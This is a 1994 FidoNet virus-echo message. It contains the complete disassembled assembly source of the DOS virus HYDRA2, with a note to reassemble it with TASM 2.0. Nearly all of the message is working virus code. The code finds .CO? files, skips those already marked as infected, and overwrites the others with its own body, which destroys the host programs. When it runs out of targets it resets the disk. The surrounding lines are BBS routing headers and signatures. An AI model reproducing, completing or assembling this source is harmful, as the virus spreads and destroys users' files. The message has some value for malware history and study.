;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 8 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : HYDRA_2.ASM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Bryan Sullivan, 2:283/718 (06 Nov 94 16:26)
;* To   : Edwin Cleton
;* Subj : HYDRA_2.ASM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Bryan.Sullivan@f718.n283.z2.fidonet.org
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                      ÛÛ
;ÛÛ                             HYDRA2                                   ÛÛ
;ÛÛ                                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ  Disassembly by: -=>Wasp<=- aka >>Night Crawler<<                    ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ  Reassemble with TASM 2.0                                            ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

DATA_1E     EQU 235H
DATA_2E     EQU 522H
DATA_3E     EQU 80H
DATA_13E    EQU 157H
DATA_14E    EQU 15AH

SEG_A       SEGMENT BYTE PUBLIC
        ASSUME  CS:SEG_A, DS:SEG_A


        ORG 100h

HYDRA2      PROC    FAR

START:
        JMP LOC_1           ; (0182)
        DB   59H, 44H, 00H, 00H
DATA_5      DB  'HyDra-2   Beta - Not For Release'
        DB  '. *.CO?'
        DB  0
DATA_8      DW  0, 84FCH
DATA_10     DW  0
DATA_11     DB  0
        DB  29 DUP (0)
DATA_12     DB  0
        DB  13 DUP (0)
COPYRIGHT   DB  'Copyright (c)'
        DB  '  1991 by C.A.V.E.  '
LOC_1:
        PUSH    AX
        MOV AX,CS
        ADD AX,1000H
        XOR DI,DI           ; Zero register
        MOV CX,157H
        MOV SI,OFFSET DS:[100H]
        MOV ES,AX
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        MOV AH,1AH
        MOV DX,OFFSET DATA_11
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV AH,4EH          ; 'N'
        MOV DX,OFFSET DATA_5+22H
        INT 21H         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        JC  LOC_5           ; Jump if carry Set
LOC_2:
        MOV AH,3DH          ; '='
        MOV AL,2
        MOV DX,OFFSET DATA_12
        MOV AL,2
        INT 21H         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        MOV BX,AX
        PUSH    ES
        POP DS
        MOV AX,3F00H
        MOV CX,0FFFFH
        MOV DX,DATA_13E
        INT 21H         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        ADD AX,157H
        MOV CS:DATA_10,AX
        CMP WORD PTR DS:DATA_14E,4459H
        JNE LOC_3           ; Jump if not equal
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
        MOV AH,4FH          ; 'O'
        INT 21H         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        JC  LOC_6           ; Jump if carry Set
        JMP SHORT LOC_2     ; (01A4)
LOC_3:
        XOR CX,CX           ; Zero register
        MOV DX,CX
        MOV AX,4200H
        INT 21H         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        JC  LOC_4           ; Jump if carry Set
        MOV AH,40H          ; '@'
        XOR DX,DX           ; Zero register
        MOV CX,CS:DATA_10
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
LOC_4:
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
LOC_5:
        MOV AH,1AH
        MOV DX,DATA_3E
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        JMP SHORT LOC_7     ; (0218)
        DB  90H
LOC_6:
        PUSH    DX
        XOR AX,AX           ; Zero register
        XOR AX,AX           ; Zero register
        MOV DS,AX
        MOV BX,DATA_2E
        MOV AH,0FFH
        MOV [BX],AH
        XOR AX,AX           ; Zero register
        INT 13H         ; Disk  dl=drive 0  ah=func 00h
                        ;  reset disk, al=return status
        MOV AX,0
        INT 21H         ; DOS Services  ah=function 00h
                        ;  terminate, cs=progm seg prefx
LOC_7:
        XOR DI,DI           ; Zero register
        MOV SI,DATA_1E
        MOV CX,22H
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        POP BX
        MOV CS:DATA_8,0
        MOV WORD PTR CS:DATA_8+2,ES
        POP BX
        JMP DWORD PTR CS:DATA_8
        DB   1EH, 07H,0B9H,0FFH,0FFH,0BEH
        DB   57H, 02H,0BFH, 00H, 01H, 2BH
        DB  0CEH,0F3H,0A4H, 2EH,0C7H, 06H
        DB   00H, 01H, 00H, 01H, 2EH, 8CH
        DB   1EH, 02H, 01H, 8BH,0C3H, 2EH
        DB  0FFH, 2EH, 00H, 01H,0CDH
        DB  20H

HYDRA2      ENDP

SEG_A       ENDS



        END START

;-+-  Terminate 1.50/Pro
; + Origin: Miami Beach BBS - Nijmegen Nl - 080-732083 - ZyX 19K2 (2:283/718)
;=============================================================================

;Yoo-hooo-oo, -!
;
;
;    þ The MeÂeO
;
;/w0,/w1,/w2   Set warning level: w0=none, w1=w2=warnings on
;
;--- Aidstest Null: /Kill
;* Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

